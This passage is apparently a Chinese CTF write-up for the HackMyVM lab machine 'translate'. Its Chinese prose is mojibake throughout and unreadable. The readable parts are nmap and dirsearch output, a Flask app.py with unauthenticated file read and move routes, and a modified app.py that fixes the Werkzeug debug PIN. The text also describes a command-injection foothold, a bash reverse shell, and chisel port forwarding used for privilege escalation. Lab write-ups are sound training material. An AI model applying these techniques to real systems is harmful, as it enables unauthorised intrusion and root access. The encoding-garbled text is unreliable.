response&lt;/title&gt;<br>|     &lt;/head&gt;<br>|     &lt;body&gt;<br>|     &lt;h1&gt;Error response&lt;/h1&gt;<br>|     &lt;p&gt;Error code: 400&lt;/p&gt;<br>|     &lt;p&gt;Message: Bad request version (<span class="hljs-string">&#x27;RTSP/1.0&#x27;</span>).&lt;/p&gt;<br>|     &lt;p&gt;Error code explanation: HTTPStatus.BAD_REQUEST - Bad request syntax or unsupported method.&lt;/p&gt;<br>|     &lt;/body&gt;<br>|_    &lt;/html&gt;<br>1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :<br>SF-Port5001-TCP:V=7.94SVN%I=7%D=5/28%Time=6837D3B0%P=x86_64-pc-linux-gnu%r<br>SF:(GetRequest,18C,<span class="hljs-string">&quot;HTTP/1\.1\x20405\x20METHOD\x20NOT\x20ALLOWED\r\nServer</span><br><span class="hljs-string">SF::\x20Werkzeug/3\.1\.3\x20Python/3\.9\.2\r\nDate:\x20Thu,\x2029\x20May\x</span><br><span class="hljs-string">SF:202025\x2003:25:35\x20GMT\r\nContent-Type:\x20text/html;\x20charset=utf</span><br><span class="hljs-string">SF:-8\r\nAllow:\x20POST,\x20OPTIONS\r\nContent-Length:\x20153\r\nAccess-Co</span><br><span class="hljs-string">SF:ntrol-Allow-Origin:\x20\*\r\nConnection:\x20close\r\n\r\n&lt;!doctype\x20h</span><br><span class="hljs-string">SF:tml&gt;\n&lt;html\x20lang=en&gt;\n&lt;title&gt;405\x20Method\x20Not\x20Allowed&lt;/title&gt;</span><br><span class="hljs-string">SF:\n&lt;h1&gt;Method\x20Not\x20Allowed&lt;/h1&gt;\n&lt;p&gt;The\x20method\x20is\x20not\x20a</span><br><span class="hljs-string">SF:llowed\x20for\x20the\x20requested\x20URL\.&lt;/p&gt;\n&quot;</span>)%r(HTTPOptions,E1,<span class="hljs-string">&quot;HT</span><br><span class="hljs-string">SF:TP/1\.1\x20200\x20OK\r\nServer:\x20Werkzeug/3\.1\.3\x20Python/3\.9\.2\r</span><br><span class="hljs-string">SF:\nDate:\x20Thu,\x2029\x20May\x202025\x2003:25:35\x20GMT\r\nContent-Type</span><br><span class="hljs-string">SF::\x20text/html;\x20charset=utf-8\r\nAllow:\x20POST,\x20OPTIONS\r\nAcces</span><br><span class="hljs-string">SF:s-Control-Allow-Origin:\x20\*\r\nContent-Length:\x200\r\nConnection:\x2</span><br><span class="hljs-string">SF:0close\r\n\r\n&quot;</span>)%r(RTSPRequest,1F4,<span class="hljs-string">&quot;&lt;!DOCTYPE\x20HTML\x20PUBLIC\x20\&quot;-/</span><br><span class="hljs-string">SF:/W3C//DTD\x20HTML\x204\.01//EN\&quot;\n\x20\x20\x20\x20\x20\x20\x20\x20\&quot;htt</span><br><span class="hljs-string">SF:p://www\.w3\.org/TR/html4/strict\.dtd\&quot;&gt;\n&lt;html&gt;\n\x20\x20\x20\x20&lt;head</span><br><span class="hljs-string">SF:&gt;\n\x20\x20\x20\x20\x20\x20\x20\x20&lt;meta\x20http-equiv=\&quot;Content-Type\&quot;</span><br><span class="hljs-string">SF:\x20content=\&quot;text/html;charset=utf-8\&quot;&gt;\n\x20\x20\x20\x20\x20\x20\x20\</span><br><span class="hljs-string">SF:x20&lt;title&gt;Error\x20response&lt;/title&gt;\n\x20\x20\x20\x20&lt;/head&gt;\n\x20\x20\</span><br><span class="hljs-string">SF:x20\x20&lt;body&gt;\n\x20\x20\x20\x20\x20\x20\x20\x20&lt;h1&gt;Error\x20response&lt;/h</span><br><span class="hljs-string">SF:1&gt;\n\x20\x20\x20\x20\x20\x20\x20\x20&lt;p&gt;Error\x20code:\x20400&lt;/p&gt;\n\x20\</span><br><span class="hljs-string">SF:x20\x20\x20\x20\x20\x20\x20&lt;p&gt;Message:\x20Bad\x20request\x20version\x20</span><br><span class="hljs-string">SF:\(&#x27;RTSP/1\.0&#x27;\)\.&lt;/p&gt;\n\x20\x20\x20\x20\x20\x20\x20\x20&lt;p&gt;Error\x20code</span><br><span class="hljs-string">SF:\x20explanation:\x20HTTPStatus\.BAD_REQUEST\x20-\x20Bad\x20request\x20s</span><br><span class="hljs-string">SF:yntax\x20or\x20unsupported\x20method\.&lt;/p&gt;\n\x20\x20\x20\x20&lt;/body&gt;\n&lt;/</span><br><span class="hljs-string">SF:html&gt;\n&quot;</span>)%r(Help,1EF,<span class="hljs-string">&quot;&lt;!DOCTYPE\x20HTML\x20PUBLIC\x20\&quot;-//W3C//DTD\x20H</span><br><span class="hljs-string">SF:TML\x204\.01//EN\&quot;\n\x20\x20\x20\x20\x20\x20\x20\x20\&quot;http://www\.w3\.o</span><br><span class="hljs-string">SF:rg/TR/html4/strict\.dtd\&quot;&gt;\n&lt;html&gt;\n\x20\x20\x20\x20&lt;head&gt;\n\x20\x20\x2</span><br><span class="hljs-string">SF:0\x20\x20\x20\x20\x20&lt;meta\x20http-equiv=\&quot;Content-Type\&quot;\x20content=\&quot;</span><br><span class="hljs-string">SF:text/html;charset=utf-8\&quot;&gt;\n\x20\x20\x20\x20\x20\x20\x20\x20&lt;title&gt;Erro</span><br><span class="hljs-string">SF:r\x20response&lt;/title&gt;\n\x20\x20\x20\x20&lt;/head&gt;\n\x20\x20\x20\x20&lt;body&gt;\</span><br><span class="hljs-string">SF:n\x20\x20\x20\x20\x20\x20\x20\x20&lt;h1&gt;Error\x20response&lt;/h1&gt;\n\x20\x20\x</span><br><span class="hljs-string">SF:20\x20\x20\x20\x20\x20&lt;p&gt;Error\x20code:\x20400&lt;/p&gt;\n\x20\x20\x20\x20\x2</span><br><span class="hljs-string">SF:0\x20\x20\x20&lt;p&gt;Message:\x20Bad\x20request\x20syntax\x20\(&#x27;HELP&#x27;\)\.&lt;/p</span><br><span class="hljs-string">SF:&gt;\n\x20\x20\x20\x20\x20\x20\x20\x20&lt;p&gt;Error\x20code\x20explanation:\x20</span><br><span class="hljs-string">SF:HTTPStatus\.BAD_REQUEST\x20-\x20Bad\x20request\x20syntax\x20or\x20unsup</span><br><span class="hljs-string">SF:ported\x20method\.&lt;/p&gt;\n\x20\x20\x20\x20&lt;/body&gt;\n&lt;/html&gt;\n&quot;</span>);<br>MAC Address: 08:00:27:32:28:EA (Oracle VirtualBox virtual NIC)<br>Device <span class="hljs-built_in">type</span>: general purpose<br>Running: Linux 4.X|5.X<br>OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5<br>OS details: Linux 4.15 - 5.8<br>Uptime guess: 1.066 days (since Tue May 27 21:52:29 2025)<br>Network Distance: 1 hop<br>TCP Sequence Prediction: Difficulty=264 (Good luck!)<br>IP ID Sequence Generation: All zeros<br>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel<br><br>TRACEROUTE<br>HOP RTT     ADDRESS<br>1   1.20 ms 192.168.56.108<br><br>NSE: Script Post-scanning.<br>Initiating NSE at 23:26<br>Completed NSE at 23:26, 0.00s elapsed<br>Initiating NSE at 23:26<br>Completed NSE at 23:26, 0.00s elapsed<br>Initiating NSE at 23:26<br>Completed NSE at 23:26, 0.00s elapsed<br>Read data files from: /usr/share/nmap<br>OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .<br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 95.00 seconds<br>           Raw packets sent: 1023 (45.806KB) | Rcvd: 1015 (41.290KB)<br></code></pre></td></tr></table></figure><p>dirsearch:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs bash">Target: http://192.168.56.108/<br><br>[23:32:46] Starting:                                                                                                                    <br>[23:32:47] 403 -  279B  - /.ht_wsr.txt                                      <br>[23:32:47] 403 -  279B  - /.htaccess.bak1                                   <br>[23:32:47] 403 -  279B  - /.htaccess.orig                                   <br>[23:32:47] 403 -  279B  - /.htaccess.sample                                 <br>[23:32:47] 403 -  279B  - /.htaccess.save<br>[23:32:47] 403 -  279B  - /.htaccess_extra                                  <br>[23:32:47] 403 -  279B  - /.htaccessBAK<br>[23:32:47] 403 -  279B  - /.htaccess_orig<br>[23:32:47] 403 -  279B  - /.htaccess_sc<br>[23:32:47] 403 -  279B  - /.htaccessOLD<br>[23:32:47] 403 -  279B  - /.htaccessOLD2<br>[23:32:47] 403 -  279B  - /.htm                                             <br>[23:32:47] 403 -  279B  - /.html<br>[23:32:47] 403 -  279B  - /.htpasswds                                       <br>[23:32:47] 403 -  279B  - /.htpasswd_test                                   <br>[23:32:47] 403 -  279B  - /.httr-oauth<br>[23:32:48] 403 -  279B  - /.php                                             <br>[23:32:50] 200 -  644B  - /admin.php                                        <br>[23:33:06] 403 -  279B  - /server-status/                                   <br>[23:33:06] 403 -  279B  - /server-status                                    <br>                                                                             <br>Task Completed<br></code></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°é™¤äº†80ç«¯å£å’Œ22ç«¯å£ä»¥å¤–è¿˜å¼€æ”¾äº†ä¸€ä¸ª5001ç«¯å£ï¼ŒæœåŠ¡ç”¨çš„æ˜¯Werkzeug&#x2F;3.1.3 Python&#x2F;3.9.2ï¼Œå½“æ—¶ä¸Šç½‘æœäº†ä¸€ä¸‹å¥½åƒæ˜¯ä¸ªwebæ¡†æ¶çš„åº•å±‚åº“ï¼Œé‡Œé¢æåˆ°äº†ä¸€èˆ¬å’Œflaské›†æˆï¼Œæˆ‘å°±æƒ³ä¼šä¸ä¼šæ˜¯flaskæ¨¡æ¿çš„sstiæ³¨å…¥æˆ–è€…ç®—pinå€¼è¿›consoleä¹‹ç±»çš„ï¼Œä¸è¿‡äº‹å®è¯æ˜æˆ‘æ–¹å‘å®Œå…¨é”™äº†ã€‚</p><p>ï¼ˆå…¶å®ä¹Ÿä¸æ˜¯å®Œå…¨é”™ï¼Œäº‹åä¸€çœ‹Bç¥çš„wpé‡Œæä¾›äº†æ›´æ”¹pinç è®¾ç½®åå¼€å¯dubugè¿›å…¥consoleç›´æ¥åå¼¹shellææƒçš„æ€è·¯ã€‚)</p><p>ä¹‹åæˆ‘å†å»æ‰¾è¿™ä¸ªåº“æœ‰æ²¡æœ‰ä»€ä¹ˆç°æˆçš„æ´å¯ä»¥æ‰“ï¼Œä½†æ˜¯æ‰¾åˆ°çš„å…¨æ˜¯3.0.xç‰ˆæœ¬çš„ï¼Œè¿™æ¡è·¯ä¹Ÿèµ°ä¸é€šäº†ã€‚</p><p>è®¿é—®webä¸»é¡µã€‚</p><p><img src="/2025/05/29/HackMyVM-translate/pH7UFqF60J.png"></p><p>çœ‹äº†æºç ï¼Œæ²¡å•¥ä¸œè¥¿ï¼Œæ²¡æœ‰keyï¼Œæ²¡æœ‰æç¤ºï¼Œä¹‹åè®¿é—®&#x2F;admin.php,æ˜¯ä¸ªç™»å½•ç•Œé¢ï¼Œä¹Ÿæ˜¯å…‰ç§ƒç§ƒçš„å•¥éƒ½æ²¡æœ‰ã€‚</p><p><img src="/2025/05/29/HackMyVM-translate/vmware_f5DrV3RHIs.png"></p><p>åœ¨yakitç”¨rockyouçˆ†äº†åŠå°æ—¶ä¹‹åæˆ‘æ”¾å¼ƒäº†ã€‚</p><h3 id="Getshell"><a href="#Getshell" class="headerlink" title="Getshell"></a>Getshell</h3><p>ä»€ä¹ˆè·¯éƒ½èµ°ä¸é€šï¼Œåªèƒ½å»è®¿é—®åˆšåˆšçš„5001ç«¯å£ã€‚nmapçš„æ‰«ææŠ¥å‘Šç»™äº†ä¸€äº›ä¿¡æ¯ï¼Œé¦–å…ˆå®ƒå¿…é¡»è¦æ±‚POSTè®¿é—®ã€‚</p><p>æ”¹æˆPOSTä¹‹åè¿˜è¦æˆ‘ä»¬æ¥ç€æ”¹content-typeï¼Œæ”¹æˆjsonå½¢å¼</p><p><img src="/2025/05/29/HackMyVM-translate/vmware_yszKIAg2wX.png"></p><p>æç¤ºè®©æˆ‘ä»¬æŒ‰ç…§å®ƒçš„æ ¼å¼å¡«é”®å€¼å¯¹ã€‚</p><p><img src="/2025/05/29/HackMyVM-translate/vmware_fG3ZiM6sEI.png"></p><p>è¿™é‡Œç¬¬ä¸‰ä¸ªå‚æ•°çš„æ ¼å¼æ˜¯text_listï¼Œéœ€è¦ç”¨æ–¹æ‹¬å·æ‹¬èµ·æ¥ã€‚</p><p>è¿”å›çš„å€¼æ˜¯ç©ºå€¼ã€‚</p><p><img src="/2025/05/29/HackMyVM-translate/vmware_SicwfeMpka.png"></p><p>æµ‹è¯•ä¸€ä¸‹å­˜åœ¨å‘½ä»¤æ‰§è¡Œç‚¹ï¼Œå³ä¸ºtext_listçš„å€¼ã€‚</p><p>å“‡è¿™è¾¹æœ¬æ¥æƒ³çœ‹ä¸€ä¸‹å½“å‰ç›®å½•ç»“æœç›´æ¥ç»™åˆšåˆšç™»å½•ç•Œé¢çš„è´¦å·å¯†ç äº†ã€‚</p><p><img src="/2025/05/29/HackMyVM-translate/vmware_MbmfVK5thD.png"></p><p>ä½†æ˜¯çœ‹äº†ä¸€çœ¼æ²¡æœ‰å†™çš„æƒé™ï¼Œæœ¬æ¥è¿˜æƒ³å†™ä¸ªwebshellä¸Šå»ã€‚</p><p><img src="/2025/05/29/HackMyVM-translate/vmware_wE1xHuJUAh.png"></p><p>é‚£åªèƒ½åå¼¹shelläº†ï¼Œcatä¸€ä¸‹passwdï¼Œæœ‰bashï¼Œä¸è¿‡æ²¡è£…ncï¼Œç”¨bashå¼¹å§ã€‚</p><p>æ‹¿åˆ°çš„ç¬¬ä¸€ä»¶äº‹æ˜¯å‡çº§æˆpty</p><p><img src="/2025/05/29/HackMyVM-translate/vmware_erJqKubMOH.png"></p><p>ä½†æ˜¯è¿™é‡Œæˆ‘ä»¬ä¹Ÿåªæ˜¯www-dataï¼Œå¾ˆå°çš„ä¸€ä¸ªæƒé™ï¼Œä¹‹åæƒ³åŠæ³•ææƒå§</p><p>æ‹¿åˆ°userflag</p><p><img src="/2025/05/29/HackMyVM-translate/vmware_VjV1wqtPt1.png"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">userflag:flag&#123;user-51860845-225a-42f3-b492-0a63bc722a96&#125;<br></code></pre></td></tr></table></figure><h3 id="ææƒ"><a href="#ææƒ" class="headerlink" title="ææƒ"></a>ææƒ</h3><p>ä¸¤ç§æ€è·¯</p><p>ç¬¬ä¸€ç§æ˜¯Bç¥wpæä¾›çš„ï¼Œå› ä¸º&#x2F;home&#x2F;welcome&#x2F;pyé‡Œå­˜æ”¾äº†flaskæœåŠ¡çš„app.pyæºç ï¼Œæ‰€ä»¥å¯ä»¥ç›´æ¥è‡ªå®šä¹‰ä¸€ä¸ªPINç ä¾›æˆ‘ä»¬è¿›å…¥åˆ°consoleã€‚</p><p>é¦–å…ˆå»ºç«‹ç«¯å£è½¬å‘ï¼Œè¿™é‡Œå› ä¸ºä¸çŸ¥é“sshå£ç±»æ‰€ä»¥ä¸èƒ½ç”¨sshï¼Œwgetä¼ ä¸€ä¸ªchiselï¼Œå°†é¶æœºçš„8000ç«¯å£ä»£ç†åˆ°æœ¬åœ°çš„3000ç«¯å£ä¸Šã€‚</p><p><img src="/2025/05/29/HackMyVM-translate/vmware_xjNQoFWnob.png"></p><p>è®¿é—®ç«¯å£ï¼Œå‘ç°æ˜¯ä¸€ä¸ªæ–‡ä»¶ç§»åŠ¨çš„æœåŠ¡ã€‚</p><p><img src="/2025/05/29/HackMyVM-translate/vmware_J3aYUH2SWH.png"></p><p>äº‹å®ä¸Šå°±æ˜¯åˆ©ç”¨äº†app.pyçš„æºç </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><code class="hljs python">www-data@translate:/home/welcome/py$ cat app.py <br><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask, request, jsonify, send_file, render_template<br><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">import</span> shutil<br><br>app = Flask(__name__)<br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/&#x27;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">index</span>():<br>    <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;index.html&#x27;</span>)<br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/id&#x27;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show_id</span>():<br>    <span class="hljs-keyword">try</span>:<br>        <span class="hljs-comment"># æ‰§è¡Œidå‘½ä»¤å¹¶è·å–è¾“å‡º</span><br>        output = os.popen(<span class="hljs-string">&#x27;id&#x27;</span>).read()<br>        <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;id.html&#x27;</span>, id_info=output)<br>    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>        <span class="hljs-keyword">return</span> jsonify(&#123;<span class="hljs-string">&#x27;error&#x27;</span>: <span class="hljs-built_in">str</span>(e)&#125;), <span class="hljs-number">500</span><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/read&#x27;</span>, methods=[<span class="hljs-string">&#x27;GET&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">read_page</span>():<br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;path&#x27;</span> <span class="hljs-keyword">in</span> request.args:<br>        <span class="hljs-keyword">return</span> read_file()<br>    <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;read.html&#x27;</span>)<br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/move&#x27;</span>, methods=[<span class="hljs-string">&#x27;GET&#x27;</span>, <span class="hljs-string">&#x27;POST&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">move_page</span>():<br>    <span class="hljs-keyword">if</span> request.method == <span class="hljs-string">&#x27;POST&#x27;</span>:<br>        <span class="hljs-keyword">return</span> move_file()<br>    <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;move.html&#x27;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">read_file</span>():<br>    <span class="hljs-keyword">try</span>:<br>        file_path = request.args.get(<span class="hljs-string">&#x27;path&#x27;</span>)<br>        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> file_path:<br>            <span class="hljs-keyword">return</span> jsonify(&#123;<span class="hljs-string">&#x27;error&#x27;</span>: <span class="hljs-string">&#x27;è¯·æä¾›æ–‡ä»¶è·¯å¾„&#x27;</span>&#125;), <span class="hljs-number">400</span><br>        <br>        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> os.path.exists(file_path):<br>            <span class="hljs-keyword">return</span> jsonify(&#123;<span class="hljs-string">&#x27;error&#x27;</span>: <span class="hljs-string">&#x27;æ–‡ä»¶ä¸å­˜åœ¨&#x27;</span>&#125;), <span class="hljs-number">404</span><br>        <br>        <span class="hljs-comment"># è¿”å›æ–‡ä»¶å†…å®¹</span><br>        <span class="hljs-keyword">return</span> send_file(file_path)<br>    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>        <span class="hljs-keyword">return</span> jsonify(&#123;<span class="hljs-string">&#x27;error&#x27;</span>: <span class="hljs-built_in">str</span>(e)&#125;), <span class="hljs-number">500</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">move_file</span>():<br>    <span class="hljs-keyword">try</span>:<br>        data = request.get_json()<br>        source_path = data.get(<span class="hljs-string">&#x27;source&#x27;</span>)<br>        target_path = data.get(<span class="hljs-string">&#x27;target&#x27;</span>)<br>        <br>        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> source_path <span class="hljs-keyword">or</span> <span class="hljs-keyword">not</span> target_path:<br>            <span class="hljs-keyword">return</span> jsonify(&#123;<span class="hljs-string">&#x27;error&#x27;</span>: <span class="hljs-string">&#x27;è¯·æä¾›æºæ–‡ä»¶è·¯å¾„å’Œç›®æ ‡è·¯å¾„&#x27;</span>&#125;), <span class="hljs-number">400</span><br>        <br>        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> os.path.exists(source_path):<br>            <span class="hljs-keyword">return</span> jsonify(&#123;<span class="hljs-string">&#x27;error&#x27;</span>: <span class="hljs-string">&#x27;æºæ–‡ä»¶ä¸å­˜åœ¨&#x27;</span>&#125;), <span class="hljs-number">404</span><br>        <br>        <span class="hljs-comment"># ç¡®ä¿ç›®æ ‡ç›®å½•å­˜åœ¨</span><br>        target_dir = os.path.dirname(target_path)<br>        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> os.path.exists(target_dir):<br>            os.makedirs(target_dir)<br>        <br>        <span class="hljs-comment"># ç§»åŠ¨æ–‡ä»¶</span><br>        shutil.move(source_path, target_path)<br>        <span class="hljs-keyword">return</span> jsonify(&#123;<span class="hljs-string">&#x27;message&#x27;</span>: <span class="hljs-string">&#x27;æ–‡ä»¶ç§»åŠ¨æˆåŠŸ&#x27;</span>, <span class="hljs-string">&#x27;target_path&#x27;</span>: target_path&#125;)<br>    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>        <span class="hljs-keyword">return</span> jsonify(&#123;<span class="hljs-string">&#x27;error&#x27;</span>: <span class="hljs-built_in">str</span>(e)&#125;), <span class="hljs-number">500</span><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    app.run(host=<span class="hljs-string">&#x27;127.0.0.1&#x27;</span>, port=<span class="hljs-number">8000</span>, debug=<span class="hljs-literal">True</span>)<br></code></pre></td></tr></table></figure><p>å¾ˆæ˜æ˜¾ï¼Œå› ä¸ºtmpç›®å½•ä¸‹æˆ‘ä»¬å¯è¯»å¯å†™ï¼Œå¯ä»¥åˆ©ç”¨è¿™ä¸ªæœåŠ¡ä½¿ç”¨æˆ‘ä»¬çš„æ¶æ„app.pyæ›¿æ¢æ‰å®ƒã€‚</p><p>æ¥ä¸‹æ¥æœ‰ä¸¤ç§æ€è·¯ã€‚</p><p>ç¬¬ä¸€ç§æ˜¯Bç¥wpæä¾›çš„ï¼Œå› ä¸º&#x2F;home&#x2F;welcome&#x2F;pyé‡Œå­˜æ”¾äº†flaskæœåŠ¡çš„app.pyæºç ï¼Œè€Œä¸”å¼€å¯äº†debugï¼Œä¸éœ€è¦é‡å¯æœåŠ¡ï¼Œæ‰€ä»¥å¯ä»¥ç›´æ¥è‡ªå®šä¹‰ä¸€ä¸ªPINç ä¾›æˆ‘ä»¬è¿›å…¥åˆ°consoleã€‚</p><figure class="highlight kotlin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><code class="hljs kotlin">from flask <span class="hljs-keyword">import</span> Flask, request, jsonify, send_file, render_template<br><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">import</span> shutil<br><br>os_environ[<span class="hljs-string">&#x27;WERKZEUG_DEBUG_PIN&#x27;</span>] = <span class="hljs-string">&#x27;123-456-789&#x27;</span><br><br>app = Flask(__name__)<br><br><span class="hljs-meta">@app</span>.route(<span class="hljs-string">&#x27;/&#x27;</span>)<br>def index():<br>    <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;index.html&#x27;</span>)<br><br><span class="hljs-meta">@app</span>.route(<span class="hljs-string">&#x27;/id&#x27;</span>)<br>def show_id():<br>    <span class="hljs-keyword">try</span>:<br>        # æ‰§è¡Œidå‘½ä»¤å¹¶è·å–è¾“å‡º<br>        output = os.popen(<span class="hljs-string">&#x27;id&#x27;</span>).read()<br>        <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;id.html&#x27;</span>, id_info=output)<br>    except Exception <span class="hljs-keyword">as</span> e:<br>        <span class="hljs-keyword">return</span> jsonify(&#123;<span class="hljs-string">&#x27;error&#x27;</span>: str(e)&#125;), <span class="hljs-number">500</span><br><br><span class="hljs-meta">@app</span>.route(<span class="hljs-string">&#x27;/read&#x27;</span>, methods=[<span class="hljs-string">&#x27;GET&#x27;</span>])<br>def read_page():<br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;path&#x27;</span> <span class="hljs-keyword">in</span> request.args:<br>        <span class="hljs-keyword">return</span> read_file()<br>    <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;read.html&#x27;</span>)<br><br><span class="hljs-meta">@app</span>.route(<span class="hljs-string">&#x27;/move&#x27;</span>, methods=[<span class="hljs-string">&#x27;GET&#x27;</span>, <span class="hljs-string">&#x27;POST&#x27;</span>])<br>def move_page():<br>    <span class="hljs-keyword">if</span> request.method == <span class="hljs-string">&#x27;POST&#x27;</span>:<br>        <span class="hljs-keyword">return</span> move_file()<br>    <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;move.html&#x27;</span>)<br><br>def read_file():<br>    <span class="hljs-keyword">try</span>:<br>        file_path = request.args.<span class="hljs-keyword">get</span>(<span class="hljs-string">&#x27;path&#x27;</span>)<br>        <span class="hljs-keyword">if</span> not file_path:<br>            <span class="hljs-keyword">return</span> jsonify(&#123;<span class="hljs-string">&#x27;error&#x27;</span>: <span class="hljs-string">&#x27;è¯·æä¾›æ–‡ä»¶è·¯å¾„&#x27;</span>&#125;), <span class="hljs-number">400</span><br>        <br>        <span class="hljs-keyword">if</span> not os.path.exists(file_path):<br>            <span class="hljs-keyword">return</span> jsonify(&#123;<span class="hljs-string">&#x27;error&#x27;</span>: <span class="hljs-string">&#x27;æ–‡ä»¶ä¸å­˜åœ¨&#x27;</span>&#125;), <span class="hljs-number">404</span><br>        <br>        # è¿”å›æ–‡ä»¶å†…å®¹<br>        <span class="hljs-keyword">return</span> send_file(file_path)<br>    except Exception <span class="hljs-keyword">as</span> e:<br>        <span class="hljs-keyword">return</span> jsonify(&#123;<span class="hljs-string">&#x27;error&#x27;</span>: str(e)&#125;), <span class="hljs-number">500</span><br><br>def move_file():<br>    <span class="hljs-keyword">try</span>:<br>        <span 